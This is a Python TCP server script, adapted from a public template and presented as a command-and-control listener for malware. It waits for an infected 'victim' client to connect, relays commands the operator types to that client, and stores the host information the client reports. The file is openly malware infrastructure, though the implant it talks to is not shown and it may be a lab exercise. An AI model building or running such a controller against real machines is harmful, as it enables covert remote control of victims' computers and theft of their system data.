"""Server
The origin of this code is from:
https://github.com/amir78729/python-TCP-client-server-template/blob/main/Server.py
"""

from socket import *
from time import ctime
import select 
import sys


class Server:
    def __init__(self):
        self.HOST = 'localhost'
        self.PORT = 12346
        self.MESSAGE_LENGTH_SIZE = 64
        self.ENCODING = 'utf-8'
        self.ADDRESS_INFORMATION = (self.HOST, self.PORT)
        self.received_data = ''
        self.status = 'WAITING'

    def get_received_info(self):
        return self.received_data

    def send_message(self, client, msg):
        message = msg.encode(self.ENCODING)
        msg_length = len(message)
        msg_length = str(msg_length).encode(self.ENCODING)
        msg_length += b' ' * (self.MESSAGE_LENGTH_SIZE - len(msg_length))
        client.send(msg_length)
        client.send(message)

    def main(self):
        server = socket(AF_INET, SOCK_STREAM)
        server.bind(self.ADDRESS_INFORMATION)
        server.listen(5)
        gets = [server, sys.stdin]

        while True:
            self.status = 'WAITING'
            print('{}\t[WAITING] waiting for a malware...'.format(ctime()))
            client, addr = server.accept()
            self.status = 'VICTIM FOUNDED'
            print('{}\t[VICTIM DETECTED] new connection from {}:{}'.format(ctime(), addr[0], addr[1]))
            gets.append(client)

            while True:
                try:
                    ready_input, ready_output, ready_exception = select.select(gets, [], [])
                    for in_message in ready_input:
                        if in_message == client:
                            message_length = int(client.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
                            message = client.recv(message_length).decode(self.ENCODING)
                            if not message:
                                break
                            self.status = 'MESSAGE RECEIVED'
                            print('{}\t[MESSAGE RECEIVED] malware: {}'.format(ctime(), message))
                            if '\n-------\nHost Name: ' in message:
                                self.received_data = message
                        else:
                            message = input()
                            if not message:
                                break
                            self.send_message(client, message)
                except ValueError:
                    self.status = 'CONNECTION LOST'
                    print('{}\t[CONNECTION LOST]'.format(ctime()))
                    break
            client.close()


if __name__ == '__main__':
    server = Server()
    server.main()
